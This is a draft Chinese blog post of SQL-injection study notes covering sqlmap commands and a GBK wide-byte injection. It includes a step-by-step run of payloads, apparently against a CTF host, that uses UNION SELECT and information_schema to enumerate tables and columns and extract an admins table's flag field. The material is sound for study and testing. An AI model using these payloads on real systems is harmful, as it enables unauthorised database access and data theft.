---
title: "SQL注入札记"
date: "2018-5-12"
subtitle: "我对你，不仅仅是喜欢，还有一点脑瓜疼……就是那种头皮发麻的感觉"
author: "Lonnie iTheds"
tags:
  - SQL
categories:
  - 网络安全
draft: true
section: "backup"
sourcePath: "markdown/_backup/SQL注入.md"
slug: "_backup/SQL注入"
---

# SQL注入

> 原理

原理就是你输入的东西被解释成命令了。
开个窗口`alert($input)`，你以为别人会说"hello word"，但是他却说")# print $password"！

> 编码规范

* 在使用网站地址注入的时候我们都需要将原来的编码转换成url编码来进行注入。

> 防御机制

* addslashes() 函数：回在预定义字符之前添加反斜杠的字符串

> 工具
* sqlmap [下载地址](https://github.com/sqlmapproject/sqlmap)

[参考学习](https://blog.csdn.net/wn314/article/details/78872828)

连接：

    python sqlmap.py -d "mysql://root:root@127.0.0.1:3306/DISSchool"

运行：

    python sqlmap.py -u "http://192.168.56.102:8080/user.php?id=0"

> 宽字节注入

[参考链接](https://klionsec.github.io/2016/05/15/mysql-wide-byte-injection/)

mysql在使用GBK编码的时候，会认为两个字符是一个汉字，第一个字节ascii码大于128，才会是一个汉字，所以如果我们在例如id=1的注入点后面输入 %df，如果报错，则说明该处存在漏洞，利用宽字节可以注入。

样例示范：

```C#
测试宽字节注入：
http://118.190.152.202:8015/index.php?id=1%df%27

http://118.190.152.202:8015/index.php?id=1ß'


http://118.190.152.202:8015/index.php?id=1%a1%27%20order%20by%208%20%23  //8个字段
http://118.190.152.202:8015/index.php?id=1¡' order by 8 #

http://118.190.152.202:8015/index.php?id=1%a1%27 and 1=21 UNION SELECT 1,2,3,4,5,6,7,8 %23 //爆出对应的数据显示位
http://118.190.152.202:8015/index.php?id=1¡' and 1=21 UNION SELECT 1,2,3,4,5,6,7,8 #

http://118.190.152.202:8015/index.php?id=1%a1%27%20and%201=21%20UNION%20SELECT%201,database(),3,version(),5,6,user(),8%20%23 //显示数据库名称baji，用户:root@localhost,版本信息: 5.5.47-0ubuntu0.14.04.1
http://118.190.152.202:8015/index.php?id=1¡' and 1=21 UNION SELECT 1,database(),3,version(),5,6,user(),8 #

http://118.190.152.202:8015/index.php?id=1%a1%27%20and%201=21%20UNION%20SELECT%201,user(),3,4,5,6,group_concat(table_name),8%20from%20information_schema.tables%20where%20table_schema=0x62616A69%20%20%23 //显示数据库bajia当前使用的用户:root@localhost,数据表名称:admins
http://118.190.152.202:8015/index.php?id=1¡' and 1=21 UNION SELECT 1,user(),3,4,5,6,group_concat(table_name),8 from information_schema.tables where table_schema=0x62616A69  #

http://118.190.152.202:8015/index.php?id=1%a1%27%20and%201=21%20UNION%20SELECT%201,user(),3,4,5,6,group_concat(column_name),8%20from%20information_schema.columns%20where%20table_name=0x61646d696e73%20%20%23 //显示字段 id,userName,userPwd,email,sex,role,money,flag
http://118.190.152.202:8015/index.php?id=1¡' and 1=21 UNION SELECT 1,user(),3,4,5,6,group_concat(column_name),8 from information_schema.columns where table_name=0x61646d696e73  #

http://118.190.152.202:8015/index.php?id=1%a1%27%20and%201=21%20UNION%20SELECT%201,2,3,4,5,6,flag,8%20from admins limit 0,1 %23  //显示flag
http://118.190.152.202:8015/index.php?id=1¡' and 1=21 UNION SELECT 1,2,3,4,5,6,flag,8 from admins limit 0,1 #
```

参考链接：

* [SQL注入之宽字节注入](https://klionsec.github.io/2016/05/15/mysql-wide-byte-injection/)
